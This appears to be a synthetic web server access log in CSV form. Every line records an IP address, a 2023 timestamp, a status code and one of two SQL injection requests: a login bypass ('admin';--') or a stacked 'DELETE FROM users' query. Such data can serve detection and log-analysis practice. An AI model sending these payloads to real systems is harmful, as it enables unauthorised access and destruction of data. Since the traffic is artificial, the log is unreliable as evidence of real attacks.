88.218.76.209,2023-01-26 21:45:18,GET /login.php?user=admin';--,200
204.104.39.248,2023-09-22 16:31:27,POST /process.php?id=1; DELETE FROM users;--,302
192.20.66.9,2023-11-14 04:15:39,POST /process.php?id=1; DELETE FROM users;--,404
151.152.31.63,2023-01-05 06:07:56,GET /login.php?user=admin';--,302
105.67.16.58,2023-11-27 20:03:48,GET /login.php?user=admin';--,302
96.60.93.17,2023-09-01 18:54:44,GET /login.php?user=admin';--,404
72.253.169.33,2023-09-04 14:51:39,POST /process.php?id=1; DELETE FROM users;--,302
136.15.92.157,2023-01-07 13:50:48,GET /login.php?user=admin';--,200
77.50.199.80,2023-02-05 18:16:47,POST /process.php?id=1; DELETE FROM users;--,200
121.167.2.162,2023-08-15 17:26:21,POST /process.php?id=1; DELETE FROM users;--,302
61.178.135.188,2023-08-26 15:26:54,GET /login.php?user=admin';--,302
192.191.52.105,2023-11-08 07:37:47,GET /login.php?user=admin';--,200
36.26.115.223,2023-04-08 12:03:30,POST /process.php?id=1; DELETE FROM users;--,200
86.74.215.97,2023-06-02 10:24:13,GET /login.php?user=admin';--,404
187.210.157.114,2023-01-09 21:27:21,GET /login.php?user=admin';--,302
60.214.117.88,2023-06-03 19:49:40,POST /process.php?id=1; DELETE FROM users;--,200
170.251.254.253,2023-11-10 03:44:07,GET /login.php?user=admin';--,404
126.59.238.194,2023-01-14 15:41:24,GET /login.php?user=admin';--,404
76.175.100.120,2023-06-08 00:36:33,GET /login.php?user=admin';--,200
81.133.98.222,2023-03-04 10:50:54,POST /process.php?id=1; DELETE FROM users;--,200
180.66.47.4,2023-07-12 07:34:28,POST /process.php?id=1; DELETE FROM users;--,302
185.221.80.55,2023-08-07 10:00:10,POST /process.php?id=1; DELETE FROM users;--,404
68.215.74.82,2023-01-15 18:29:32,POST /process.php?id=1; DELETE FROM users;--,404
111.9.143.139,2023-08-30 18:51:47,GET /login.php?user=admin';--,302
29.29.105.164,2023-03-31 19:53:32,GET /login.php?user=admin';--,302
37.163.217.224,2023-03-31 10:14:00,POST /process.php?id=1; DELETE FROM users;--,302
158.192.68.118,2023-03-05 22:56:58,GET /login.php?user=admin';--,404
131.14.16.230,2023-11-11 11:21:35,POST /process.php?id=1; DELETE FROM users;--,200
155.203.127.127,2023-05-03 02:35:37,GET /login.php?user=admin';--,200
168.97.60.174,2023-05-24 19:19:13,GET /login.php?user=admin';--,404
28.235.255.205,2023-09-13 20:47:26,POST /process.php?id=1; DELETE FROM users;--,404
177.108.137.24,2023-02-24 12:31:04,POST /process.php?id=1; DELETE FROM users;--,302
181.4.237.117,2023-11-18 15:01:02,GET /login.php?user=admin';--,200
147.5.212.100,2023-07-17 17:42:27,POST /process.php?id=1; DELETE FROM users;--,200
211.208.39.167,2023-04-10 18:21:18,GET /login.php?user=admin';--,200
187.185.50.179,2023-11-11 22:33:17,GET /login.php?user=admin';--,404
45.212.213.202,2023-01-15 09:00:52,GET /login.php?user=admin';--,404
122.228.5.170,2023-04-11 18:35:33,POST /process.php?id=1; DELETE FROM users;--,200
31.156.111.110,2023-03-03 18:09:19,GET /login.php?user=admin';--,302
152.129.79.236,2023-05-22 08:22:24,POST /process.php?id=1; DELETE FROM users;--,404
163.26.89.41,2023-11-06 02:05:22,POST /process.php?id=1; DELETE FROM users;--,404
18.202.46.59,2023-07-26 15:15:13,POST /process.php?id=1; DELETE FROM users;--,302
130.6.35.23,2023-03-13 06:28:48,POST /process.php?id=1; DELETE FROM users;--,404
206.178.31.214,2023-08-30 17:28:24,GET /login.php?user=admin';--,200
34.167.145.138,2023-09-25 02:16:20,POST /process.php?id=1; DELETE FROM users;--,302
73.172.140.130,2023-04-11 16:01:33,GET /login.php?user=admin';--,200
92.133.203.7,2023-09-28 21:06:03,GET /login.php?user=admin';--,404
164.35.158.40,2023-05-31 09:47:40,POST /process.php?id=1; DELETE FROM users;--,302
22.67.108.78,2023-09-16 21:25:05,GET /login.php?user=admin';--,302
187.175.65.73,2023-07-07 07:51:24,GET /login.php?user=admin';--,200
6.203.104.114,2023-04-25 21:53:23,POST /process.php?id=1; DELETE FROM users;--,200
182.108.48.187,2023-10-23 05:41:21,GET /login.php?user=admin';--,200
1.146.60.59,2023-10-08 01:33:52,POST /process.php?id=1; DELETE FROM users;--,404
109.0.114.111,2023-03-29 03:35:16,POST /process.php?id=1; DELETE FROM users;--,404
215.186.173.78,2023-02-24 03:10:17,GET /login.php?user=admin';--,404
101.218.119.176,2023-09-30 23:05:06,GET /login.php?user=admin';--,302
139.177.217.18,2023-04-24 14:17:24,POST /process.php?id=1; DELETE FROM users;--,302
211.88.214.91,2023-01-23 12:14:27,GET /login.php?user=admin';--,404
123.79.128.159,2023-01-27 06:35:00,POST /process.php?id=1; DELETE FROM users;--,200
212.252.1.240,2023-08-02 11:03:51,GET /login.php?user=admin';--,302
135.109.79.3,2023-03-06 14:40:51,POST /process.php?id=1; DELETE FROM users;--,404
185.89.216.17,2023-07-01 23:34:45,GET /login.php?user=admin';--,302
206.119.21.54,2023-08-01 21:31:40,GET /login.php?user=admin';--,302
105.72.219.244,2023-09-15 14:31:12,GET /login.php?user=admin';--,200
195.149.132.5,2023-07-17 14:27:49,GET /login.php?user=admin';--,200
155.44.137.204,2023-08-17 15:42:53,POST /process.php?id=1; DELETE FROM users;--,302
128.137.220.80,2023-06-03 03:14:33,POST /process.php?id=1; DELETE FROM users;--,302
10.59.209.5,2023-04-26 04:38:18,POST /process.php?id=1; DELETE FROM users;--,302
97.199.82.185,2023-10-24 01:36:01,GET /login.php?user=admin';--,302
140.68.83.101,2023-01-01 10:27:44,POST /process.php?id=1; DELETE FROM users;--,404
134.20.112.35,2023-11-10 22:44:31,GET /login.php?user=admin';--,200
5.43.239.70,2023-04-29 04:14:42,GET /login.php?user=admin';--,302
54.12.40.145,2023-09-21 11:14:57,POST /process.php?id=1; DELETE FROM users;--,404
198.166.254.240,2023-02-08 19:27:32,POST /process.php?id=1; DELETE FROM users;--,302
179.179.207.192,2023-10-22 21:00:34,POST /process.php?id=1; DELETE FROM users;--,200
76.220.61.68,2023-03-07 00:40:54,GET /login.php?user=admin';--,200
85.160.129.30,2023-08-19 15:07:15,GET /login.php?user=admin';--,404
53.42.125.218,2023-01-17 09:53:21,POST /process.php?id=1; DELETE FROM users;--,302
32.15.82.190,2023-03-30 13:05:23,GET /login.php?user=admin';--,302
168.138.197.162,2023-11-14 21:38:26,POST /process.php?id=1; DELETE FROM users;--,404
34.113.61.3,2023-01-05 00:53:17,POST /process.php?id=1; DELETE FROM users;--,302
94.142.189.89,2023-08-13 16:45:52,POST /process.php?id=1; DELETE FROM users;--,404
173.141.133.56,2023-10-26 07:53:57,GET /login.php?user=admin';--,404
36.155.7.252,2023-07-10 11:00:32,POST /process.php?id=1; DELETE FROM users;--,200
119.163.144.149,2023-01-14 12:52:46,GET /login.php?user=admin';--,302
65.134.161.99,2023-04-15 05:45:42,POST /process.php?id=1; DELETE FROM users;--,404
168.180.214.56,2023-10-27 00:13:16,GET /login.php?user=admin';--,404
211.211.12.255,2023-05-10 08:21:00,GET /login.php?user=admin';--,200
35.9.26.56,2023-09-12 01:15:56,POST /process.php?id=1; DELETE FROM users;--,200
55.208.104.225,2023-07-17 16:33:57,GET /login.php?user=admin';--,200
95.87.193.43,2023-09-14 04:33:50,POST /process.php?id=1; DELETE FROM users;--,200
152.136.83.106,2023-04-16 03:16:47,POST /process.php?id=1; DELETE FROM users;--,200
111.45.7.60,2023-01-12 13:35:00,GET /login.php?user=admin';--,302
204.101.139.144,2023-03-22 03:10:17,POST /process.php?id=1; DELETE FROM users;--,404
155.154.119.72,2023-11-26 05:11:06,POST /process.php?id=1; DELETE FROM users;--,302
6.86.248.143,2023-01-23 13:56:54,POST /process.php?id=1; DELETE FROM users;--,302
26.60.46.114,2023-04-19 00:17:30,POST /process.php?id=1; DELETE FROM users;--,302
46.17.227.207,2023-02-27 12:12:56,POST /process.php?id=1; DELETE FROM users;--,404
219.203.20.156,2023-04-15 23:45:36,GET /login.php?user=admin';--,404
129.220.171.68,2023-10-27 02:07:58,GET /login.php?user=admin';--,200
158.107.146.118,2023-04-06 14:09:40,POST /process.php?id=1; DELETE FROM users;--,302
69.179.152.222,2023-10-17 05:14:17,GET /login.php?user=admin';--,200
106.35.199.59,2023-04-13 13:44:47,POST /process.php?id=1; DELETE FROM users;--,404
92.49.60.5,2023-10-04 00:36:30,POST /process.php?id=1; DELETE FROM users;--,200
122.173.141.35,2023-07-30 10:34:50,POST /process.php?id=1; DELETE FROM users;--,302
12.156.26.126,2023-04-05 08:57:42,GET /login.php?user=admin';--,200
206.87.119.77,2023-10-27 17:27:27,GET /login.php?user=admin';--,404
106.204.208.212,2023-03-16 06:03:23,GET /login.php?user=admin';--,200
78.104.7.18,2023-09-25 04:56:05,GET /login.php?user=admin';--,404
147.76.211.3,2023-05-17 23:14:47,GET /login.php?user=admin';--,200
18.185.228.29,2023-02-19 21:06:52,GET /login.php?user=admin';--,302
103.47.215.105,2023-06-08 12:21:10,POST /process.php?id=1; DELETE FROM users;--,302
216.100.103.112,2023-04-09 19:41:28,GET /login.php?user=admin';--,302
52.245.212.5,2023-03-29 17:09:35,POST /process.php?id=1; DELETE FROM users;--,200
194.29.1.90,2023-03-13 15:38:49,POST /process.php?id=1; DELETE FROM users;--,302
214.4.114.200,2023-09-13 11:09:37,GET /login.php?user=admin';--,302
193.65.218.68,2023-09-24 10:19:25,GET /login.php?user=admin';--,302
4.59.79.119,2023-01-21 04:18:47,POST /process.php?id=1; DELETE FROM users;--,404
6.102.88.42,2023-05-12 02:45:56,POST /process.php?id=1; DELETE FROM users;--,302
169.138.193.71,2023-03-02 04:12:34,GET /login.php?user=admin';--,302
43.46.169.219,2023-03-24 17:04:07,GET /login.php?user=admin';--,200
23.124.127.68,2023-01-25 17:16:52,GET /login.php?user=admin';--,200
76.65.236.224,2023-11-22 03:38:51,GET /login.php?user=admin';--,302
164.247.70.111,2023-06-15 12:51:02,GET /login.php?user=admin';--,200
175.34.84.225,2023-01-02 18:13:12,POST /process.php?id=1; DELETE FROM users;--,404
34.186.241.114,2023-06-10 01:49:57,GET /login.php?user=admin';--,404
48.11.168.83,2023-10-15 01:16:01,POST /process.php?id=1; DELETE FROM users;--,302
74.16.159.170,2023-08-21 04:21:25,POST /process.php?id=1; DELETE FROM users;--,200
34.11.179.216,2023-09-24 19:13:40,GET /login.php?user=admin';--,200
46.199.184.12,2023-05-27 03:24:54,GET /login.php?user=admin';--,404
29.114.73.153,2023-08-15 02:59:02,GET /login.php?user=admin';--,200
190.146.109.244,2023-11-24 18:55:33,POST /process.php?id=1; DELETE FROM users;--,404
44.140.222.37,2023-07-09 19:23:51,POST /process.php?id=1; DELETE FROM users;--,404
1.89.168.221,2023-05-22 00:59:02,GET /login.php?user=admin';--,404
165.48.210.51,2023-03-09 00:47:15,GET /login.php?user=admin';--,302
121.198.226.193,2023-03-21 15:29:54,POST /process.php?id=1; DELETE FROM users;--,302
137.236.46.1,2023-08-26 23:38:12,GET /login.php?user=admin';--,404
54.226.223.97,2023-11-09 15:23:27,POST /process.php?id=1; DELETE FROM users;--,302
67.46.131.15,2023-10-19 02:18:56,GET /login.php?user=admin';--,200
81.249.51.239,2023-08-07 04:15:16,GET /login.php?user=admin';--,404
156.58.154.230,2023-02-19 11:32:07,GET /login.php?user=admin';--,200
85.26.37.201,2023-01-31 10:16:43,POST /process.php?id=1; DELETE FROM users;--,200
141.52.201.83,2023-03-24 05:04:50,POST /process.php?id=1; DELETE FROM users;--,302
171.48.22.188,2023-06-22 22:08:32,POST /process.php?id=1; DELETE FROM users;--,200
36.194.171.246,2023-03-19 07:08:21,GET /login.php?user=admin';--,302
95.56.120.198,2023-07-26 02:54:06,GET /login.php?user=admin';--,302
66.9.239.104,2023-09-02 10:36:04,GET /login.php?user=admin';--,200
35.229.210.53,2023-06-12 12:00:11,GET /login.php?user=admin';--,302
139.20.70.142,2023-09-02 09:38:45,POST /process.php?id=1; DELETE FROM users;--,200
221.213.64.130,2023-03-16 13:18:01,GET /login.php?user=admin';--,200
81.47.138.168,2023-02-10 10:36:09,POST /process.php?id=1; DELETE FROM users;--,200
98.158.161.109,2023-05-24 13:16:12,GET /login.php?user=admin';--,302
106.46.193.255,2023-06-22 21:49:00,POST /process.php?id=1; DELETE FROM users;--,302
29.86.158.227,2023-05-13 05:41:20,POST /process.php?id=1; DELETE FROM users;--,302
60.185.218.155,2023-06-30 14:23:24,GET /login.php?user=admin';--,200
67.128.127.244,2023-10-28 02:09:31,GET /login.php?user=admin';--,302
44.124.198.242,2023-01-04 21:47:01,POST /process.php?id=1; DELETE FROM users;--,200
213.180.249.238,2023-08-02 00:43:07,GET /login.php?user=admin';--,200
102.117.253.240,2023-02-12 19:48:40,GET /login.php?user=admin';--,200
175.34.175.170,2023-04-16 20:00:07,GET /login.php?user=admin';--,404
141.11.198.179,2023-05-20 20:05:48,POST /process.php?id=1; DELETE FROM users;--,404
146.161.126.126,2023-07-26 12:21:14,GET /login.php?user=admin';--,404
168.181.245.193,2023-11-29 08:17:58,POST /process.php?id=1; DELETE FROM users;--,404
209.177.106.249,2023-01-09 16:40:10,GET /login.php?user=admin';--,200
18.217.187.247,2023-01-15 17:11:05,GET /login.php?user=admin';--,404
80.122.39.210,2023-11-03 09:54:26,POST /process.php?id=1; DELETE FROM users;--,302
194.26.202.23,2023-03-30 20:03:58,GET /login.php?user=admin';--,200
79.213.58.103,2023-10-19 14:33:21,GET /login.php?user=admin';--,200
190.240.74.27,2023-06-15 08:17:47,POST /process.php?id=1; DELETE FROM users;--,404
174.149.103.123,2023-03-19 06:07:38,GET /login.php?user=admin';--,302
164.183.117.109,2023-01-18 08:07:24,POST /process.php?id=1; DELETE FROM users;--,302
181.128.24.193,2023-06-06 01:36:53,POST /process.php?id=1; DELETE FROM users;--,302
71.107.172.47,2023-02-05 05:27:19,POST /process.php?id=1; DELETE FROM users;--,404
169.155.93.190,2023-10-26 10:37:06,GET /login.php?user=admin';--,404
9.251.80.40,2023-10-17 21:55:50,POST /process.php?id=1; DELETE FROM users;--,302
116.151.121.21,2023-06-04 13:06:37,GET /login.php?user=admin';--,302
129.235.7.176,2023-07-31 23:20:58,GET /login.php?user=admin';--,200
185.164.132.189,2023-05-13 11:40:56,GET /login.php?user=admin';--,200
130.215.57.63,2023-02-05 01:07:27,GET /login.php?user=admin';--,200
141.195.65.184,2023-11-16 21:14:21,POST /process.php?id=1; DELETE FROM users;--,200
35.61.181.128,2023-08-05 10:19:15,POST /process.php?id=1; DELETE FROM users;--,200
28.33.197.72,2023-05-12 10:47:08,POST /process.php?id=1; DELETE FROM users;--,404
161.31.250.79,2023-11-03 10:33:45,GET /login.php?user=admin';--,302
173.208.104.114,2023-03-18 12:29:29,POST /process.php?id=1; DELETE FROM users;--,302
128.51.149.176,2023-07-17 22:44:41,GET /login.php?user=admin';--,302
106.200.66.6,2023-05-20 03:58:38,GET /login.php?user=admin';--,302
187.24.44.109,2023-09-09 12:50:24,POST /process.php?id=1; DELETE FROM users;--,302
40.17.38.122,2023-10-22 02:23:06,POST /process.php?id=1; DELETE FROM users;--,200
45.215.230.198,2023-07-14 13:46:46,POST /process.php?id=1; DELETE FROM users;--,200
147.45.141.191,2023-06-22 00:46:28,POST /process.php?id=1; DELETE FROM users;--,302
200.190.220.44,2023-02-28 00:26:28,GET /login.php?user=admin';--,302
37.24.43.238,2023-10-13 19:39:52,POST /process.php?id=1; DELETE FROM users;--,302
51.94.183.215,2023-05-08 06:16:45,GET /login.php?user=admin';--,404
24.80.36.56,2023-06-06 03:51:44,GET /login.php?user=admin';--,200
9.240.19.253,2023-07-01 13:01:19,GET /login.php?user=admin';--,200
215.57.145.242,2023-11-28 05:09:45,POST /process.php?id=1; DELETE FROM users;--,200
89.117.81.183,2023-08-20 19:01:26,POST /process.php?id=1; DELETE FROM users;--,404
68.236.64.196,2023-05-11 12:11:12,POST /process.php?id=1; DELETE FROM users;--,200
121.118.217.168,2023-04-12 03:50:58,GET /login.php?user=admin';--,404
71.173.73.180,2023-07-12 17:24:15,GET /login.php?user=admin';--,200
144.238.140.99,2023-06-25 14:19:52,POST /process.php?id=1; DELETE FROM users;--,302
75.40.30.210,2023-08-30 10:17:05,GET /login.php?user=admin';--,200
2.218.158.52,2023-04-29 04:36:55,POST /process.php?id=1; DELETE FROM users;--,302
91.65.106.28,2023-05-29 03:16:21,POST /process.php?id=1; DELETE FROM users;--,302
145.186.15.103,2023-06-15 05:12:38,POST /process.php?id=1; DELETE FROM users;--,302
151.111.35.144,2023-05-04 17:37:39,POST /process.php?id=1; DELETE FROM users;--,200
51.227.36.1,2023-10-08 17:51:18,GET /login.php?user=admin';--,302
137.217.154.176,2023-08-03 12:18:15,GET /login.php?user=admin';--,302
31.7.224.127,2023-03-10 19:56:59,GET /login.php?user=admin';--,200
11.33.163.239,2023-05-16 11:19:33,POST /process.php?id=1; DELETE FROM users;--,200
129.54.200.20,2023-05-24 01:57:20,GET /login.php?user=admin';--,404
53.46.31.234,2023-01-03 06:22:26,GET /login.php?user=admin';--,302
223.235.51.253,2023-06-30 06:53:27,GET /login.php?user=admin';--,200
56.251.168.19,2023-04-06 08:08:46,GET /login.php?user=admin';--,200
223.87.239.254,2023-08-26 10:33:24,POST /process.php?id=1; DELETE FROM users;--,302
209.219.33.33,2023-02-11 21:24:09,POST /process.php?id=1; DELETE FROM users;--,200
151.27.131.68,2023-08-04 23:17:49,GET /login.php?user=admin';--,302
198.163.89.207,2023-09-03 23:00:33,GET /login.php?user=admin';--,404
170.4.127.222,2023-11-14 10:57:59,GET /login.php?user=admin';--,302
94.183.131.80,2023-04-22 02:20:14,GET /login.php?user=admin';--,302
84.22.46.137,2023-06-04 14:00:30,POST /process.php?id=1; DELETE FROM users;--,302
194.205.32.225,2023-10-28 15:50:49,POST /process.php?id=1; DELETE FROM users;--,200
86.18.195.40,2023-05-04 09:14:17,GET /login.php?user=admin';--,302
131.18.193.84,2023-09-12 13:52:38,GET /login.php?user=admin';--,404
74.200.70.136,2023-03-19 21:20:09,POST /process.php?id=1; DELETE FROM users;--,302
152.121.227.204,2023-08-05 00:50:24,GET /login.php?user=admin';--,200
83.239.80.118,2023-01-17 13:24:31,GET /login.php?user=admin';--,200
148.117.37.63,2023-05-30 23:28:13,POST /process.php?id=1; DELETE FROM users;--,302
33.195.199.171,2023-08-23 16:40:36,POST /process.php?id=1; DELETE FROM users;--,200
13.186.240.224,2023-01-17 03:03:22,GET /login.php?user=admin';--,200
189.32.180.196,2023-07-05 03:55:12,GET /login.php?user=admin';--,302
119.121.150.216,2023-03-08 16:11:17,GET /login.php?user=admin';--,302
30.224.249.80,2023-02-19 14:15:01,GET /login.php?user=admin';--,302
134.184.123.15,2023-08-08 21:20:54,POST /process.php?id=1; DELETE FROM users;--,404
100.48.60.45,2023-05-26 22:26:29,GET /login.php?user=admin';--,302
25.138.143.169,2023-06-16 22:25:04,POST /process.php?id=1; DELETE FROM users;--,200
39.103.95.166,2023-06-20 08:08:22,POST /process.php?id=1; DELETE FROM users;--,302
212.6.33.108,2023-01-26 21:59:32,POST /process.php?id=1; DELETE FROM users;--,404
177.27.21.10,2023-03-28 00:39:07,POST /process.php?id=1; DELETE FROM users;--,404
52.208.108.214,2023-06-20 16:31:22,GET /login.php?user=admin';--,200
181.181.88.90,2023-11-16 06:53:03,GET /login.php?user=admin';--,404
179.85.155.189,2023-08-23 10:25:24,GET /login.php?user=admin';--,200
211.181.57.146,2023-03-31 03:18:44,POST /process.php?id=1; DELETE FROM users;--,302
45.109.78.144,2023-02-27 19:05:16,GET /login.php?user=admin';--,302
111.149.187.236,2023-11-04 06:06:33,GET /login.php?user=admin';--,302
62.104.56.38,2023-05-08 22:06:58,GET /login.php?user=admin';--,200
158.102.203.72,2023-09-19 20:37:44,GET /login.php?user=admin';--,200
18.41.165.170,2023-03-31 06:38:01,POST /process.php?id=1; DELETE FROM users;--,302
19.158.124.34,2023-11-12 19:28:23,GET /login.php?user=admin';--,200
195.192.164.79,2023-05-22 09:39:20,POST /process.php?id=1; DELETE FROM users;--,404
185.140.86.132,2023-11-05 06:20:46,GET /login.php?user=admin';--,404
83.181.10.48,2023-01-29 22:23:16,POST /process.php?id=1; DELETE FROM users;--,404
30.101.34.4,2023-08-15 08:35:07,POST /process.php?id=1; DELETE FROM users;--,302
55.183.35.14,2023-01-09 15:22:17,POST /process.php?id=1; DELETE FROM users;--,302
161.119.70.43,2023-03-13 03:12:05,POST /process.php?id=1; DELETE FROM users;--,200
216.222.98.57,2023-11-10 01:34:53,GET /login.php?user=admin';--,302
160.225.241.169,2023-03-03 09:34:22,GET /login.php?user=admin';--,302
148.210.61.118,2023-05-11 09:39:32,GET /login.php?user=admin';--,302
220.98.89.53,2023-04-04 21:07:24,POST /process.php?id=1; DELETE FROM users;--,404
79.197.92.207,2023-10-30 13:02:13,GET /login.php?user=admin';--,200
41.240.75.57,2023-04-20 00:25:40,GET /login.php?user=admin';--,404
51.0.205.151,2023-08-14 14:07:16,GET /login.php?user=admin';--,200
174.142.127.107,2023-03-02 11:05:39,POST /process.php?id=1; DELETE FROM users;--,404
164.41.46.58,2023-04-28 21:19:11,POST /process.php?id=1; DELETE FROM users;--,404
77.13.57.189,2023-05-02 18:20:44,GET /login.php?user=admin';--,302
131.15.227.150,2023-11-03 16:48:49,POST /process.php?id=1; DELETE FROM users;--,404
96.207.151.228,2023-03-07 15:24:16,GET /login.php?user=admin';--,302
183.136.122.49,2023-09-22 03:45:04,GET /login.php?user=admin';--,200
76.220.102.150,2023-07-13 20:29:44,GET /login.php?user=admin';--,302
180.197.226.216,2023-03-30 08:30:52,GET /login.php?user=admin';--,404
173.76.117.42,2023-05-06 19:31:48,POST /process.php?id=1; DELETE FROM users;--,404
48.180.213.2,2023-07-12 01:22:02,GET /login.php?user=admin';--,200
68.219.199.41,2023-09-10 14:19:43,GET /login.php?user=admin';--,302
129.72.187.116,2023-10-08 23:12:45,POST /process.php?id=1; DELETE FROM users;--,200
71.55.240.161,2023-06-24 00:48:00,POST /process.php?id=1; DELETE FROM users;--,200
186.251.202.148,2023-11-29 01:14:10,GET /login.php?user=admin';--,302
33.227.37.164,2023-11-03 00:23:00,POST /process.php?id=1; DELETE FROM users;--,302
47.162.71.105,2023-10-25 16:03:47,GET /login.php?user=admin';--,200
90.117.75.147,2023-02-10 12:46:34,GET /login.php?user=admin';--,200
148.43.217.2,2023-09-06 14:43:47,POST /process.php?id=1; DELETE FROM users;--,302
104.103.67.174,2023-11-06 13:28:57,POST /process.php?id=1; DELETE FROM users;--,200
152.115.83.1,2023-08-18 11:59:19,POST /process.php?id=1; DELETE FROM users;--,404
21.214.151.222,2023-01-19 14:38:04,GET /login.php?user=admin';--,404
136.126.10.83,2023-11-16 20:24:51,GET /login.php?user=admin';--,200
109.59.114.55,2023-02-07 02:18:04,GET /login.php?user=admin';--,302
170.224.23.246,2023-07-21 19:23:30,GET /login.php?user=admin';--,404
136.157.233.76,2023-08-09 00:05:25,POST /process.php?id=1; DELETE FROM users;--,302
141.183.78.19,2023-05-10 10:48:21,POST /process.php?id=1; DELETE FROM users;--,404
77.153.116.189,2023-08-10 12:32:23,GET /login.php?user=admin';--,404
99.105.8.239,2023-10-25 14:18:14,GET /login.php?user=admin';--,200
151.211.65.183,2023-11-03 23:01:41,POST /process.php?id=1; DELETE FROM users;--,404
44.190.238.151,2023-01-22 17:45:21,POST /process.php?id=1; DELETE FROM users;--,200
189.178.49.28,2023-07-25 06:53:29,POST /process.php?id=1; DELETE FROM users;--,200
157.202.167.3,2023-04-17 02:42:32,GET /login.php?user=admin';--,404
100.198.20.43,2023-07-04 01:04:44,GET /login.php?user=admin';--,404
218.234.133.178,2023-09-16 14:02:22,GET /login.php?user=admin';--,404
118.58.72.44,2023-03-24 05:43:49,POST /process.php?id=1; DELETE FROM users;--,302
20.137.68.208,2023-10-29 15:58:51,POST /process.php?id=1; DELETE FROM users;--,302
66.220.153.65,2023-07-21 16:44:14,POST /process.php?id=1; DELETE FROM users;--,200
56.107.215.43,2023-08-28 13:02:52,POST /process.php?id=1; DELETE FROM users;--,200
178.131.126.120,2023-09-26 00:38:35,POST /process.php?id=1; DELETE FROM users;--,302
181.189.195.49,2023-06-25 03:47:06,GET /login.php?user=admin';--,404
83.126.17.122,2023-06-05 13:54:59,GET /login.php?user=admin';--,200
70.38.45.175,2023-10-18 00:32:07,POST /process.php?id=1; DELETE FROM users;--,404
36.137.253.153,2023-08-25 10:00:46,GET /login.php?user=admin';--,200
107.153.105.112,2023-04-10 19:30:25,POST /process.php?id=1; DELETE FROM users;--,404
184.173.47.147,2023-08-02 05:37:09,POST /process.php?id=1; DELETE FROM users;--,302
220.142.209.20,2023-04-20 08:25:45,GET /login.php?user=admin';--,404
117.202.42.202,2023-11-27 21:47:53,GET /login.php?user=admin';--,404
123.5.40.138,2023-11-16 08:07:02,GET /login.php?user=admin';--,404
171.125.189.117,2023-03-23 15:15:02,GET /login.php?user=admin';--,302
159.68.81.63,2023-02-19 06:59:09,GET /login.php?user=admin';--,404
76.51.56.242,2023-08-20 03:07:25,POST /process.php?id=1; DELETE FROM users;--,404
151.254.6.34,2023-05-01 03:29:36,POST /process.php?id=1; DELETE FROM users;--,200
139.107.146.192,2023-01-17 23:39:35,POST /process.php?id=1; DELETE FROM users;--,200
39.202.14.116,2023-03-04 10:54:36,POST /process.php?id=1; DELETE FROM users;--,404
187.196.128.179,2023-05-11 16:42:25,GET /login.php?user=admin';--,404
134.168.230.39,2023-08-29 11:12:25,POST /process.php?id=1; DELETE FROM users;--,302
88.69.232.101,2023-09-27 06:44:15,POST /process.php?id=1; DELETE FROM users;--,404
38.68.178.205,2023-11-04 10:59:37,GET /login.php?user=admin';--,302
150.231.39.156,2023-09-17 08:49:50,POST /process.php?id=1; DELETE FROM users;--,302
6.2.185.221,2023-06-27 17:30:00,GET /login.php?user=admin';--,200
152.179.172.153,2023-02-24 23:44:09,POST /process.php?id=1; DELETE FROM users;--,200
36.10.108.246,2023-10-12 22:01:13,POST /process.php?id=1; DELETE FROM users;--,404
14.221.131.225,2023-05-16 15:19:26,POST /process.php?id=1; DELETE FROM users;--,200
94.22.200.228,2023-10-28 13:24:10,POST /process.php?id=1; DELETE FROM users;--,404
109.43.44.248,2023-02-06 10:34:38,GET /login.php?user=admin';--,200
106.34.127.60,2023-09-06 18:13:17,GET /login.php?user=admin';--,404
88.5.227.175,2023-08-02 23:42:11,POST /process.php?id=1; DELETE FROM users;--,404
67.170.97.117,2023-08-15 18:33:05,POST /process.php?id=1; DELETE FROM users;--,404
124.174.128.98,2023-03-06 09:41:59,GET /login.php?user=admin';--,404
62.233.128.205,2023-06-11 20:20:37,POST /process.php?id=1; DELETE FROM users;--,404
2.104.158.192,2023-05-10 10:42:59,POST /process.php?id=1; DELETE FROM users;--,302
133.72.18.218,2023-01-06 13:35:05,POST /process.php?id=1; DELETE FROM users;--,404
96.226.2.4,2023-07-02 13:09:32,GET /login.php?user=admin';--,404
113.212.46.33,2023-09-26 13:09:33,POST /process.php?id=1; DELETE FROM users;--,200
135.148.49.175,2023-09-29 13:56:37,POST /process.php?id=1; DELETE FROM users;--,302
216.33.183.36,2023-01-26 08:21:06,GET /login.php?user=admin';--,200
49.98.244.144,2023-03-08 05:24:30,GET /login.php?user=admin';--,302
34.140.156.5,2023-03-30 19:37:32,GET /login.php?user=admin';--,200
10.97.185.52,2023-01-23 02:34:31,GET /login.php?user=admin';--,200
9.217.17.36,2023-02-25 10:04:15,POST /process.php?id=1; DELETE FROM users;--,200
221.242.126.6,2023-05-12 14:25:29,POST /process.php?id=1; DELETE FROM users;--,302
162.10.10.169,2023-04-22 12:56:39,GET /login.php?user=admin';--,302
100.194.177.179,2023-06-19 07:45:31,GET /login.php?user=admin';--,404
150.77.227.103,2023-06-28 02:08:11,POST /process.php?id=1; DELETE FROM users;--,200
42.95.226.157,2023-09-20 15:28:26,GET /login.php?user=admin';--,200
12.224.97.194,2023-02-24 11:26:40,POST /process.php?id=1; DELETE FROM users;--,404
69.14.198.167,2023-06-09 11:54:11,POST /process.php?id=1; DELETE FROM users;--,200
101.14.204.114,2023-05-20 02:16:47,GET /login.php?user=admin';--,302
221.226.182.8,2023-08-01 16:07:51,GET /login.php?user=admin';--,404
108.229.188.36,2023-02-13 16:24:32,POST /process.php?id=1; DELETE FROM users;--,302
41.88.171.119,2023-06-17 08:08:40,POST /process.php?id=1; DELETE FROM users;--,200
96.210.71.144,2023-03-09 10:00:13,POST /process.php?id=1; DELETE FROM users;--,200
135.240.245.26,2023-01-27 15:14:18,GET /login.php?user=admin';--,302
129.97.208.6,2023-03-21 21:19:51,GET /login.php?user=admin';--,302
114.172.65.38,2023-03-07 13:21:14,GET /login.php?user=admin';--,302
125.200.71.109,2023-02-17 22:52:56,POST /process.php?id=1; DELETE FROM users;--,302
74.29.244.235,2023-06-30 20:53:48,POST /process.php?id=1; DELETE FROM users;--,404
193.146.199.198,2023-02-11 16:18:03,GET /login.php?user=admin';--,200
6.107.67.178,2023-03-22 21:40:31,POST /process.php?id=1; DELETE FROM users;--,302
86.177.237.91,2023-08-01 14:48:48,GET /login.php?user=admin';--,200
163.40.44.26,2023-03-28 23:37:43,POST /process.php?id=1; DELETE FROM users;--,302
169.172.164.9,2023-10-02 02:03:35,POST /process.php?id=1; DELETE FROM users;--,404
170.87.108.11,2023-03-13 01:25:02,POST /process.php?id=1; DELETE FROM users;--,404
116.167.52.169,2023-02-04 13:24:55,POST /process.php?id=1; DELETE FROM users;--,200
140.61.148.59,2023-05-31 00:40:22,GET /login.php?user=admin';--,302
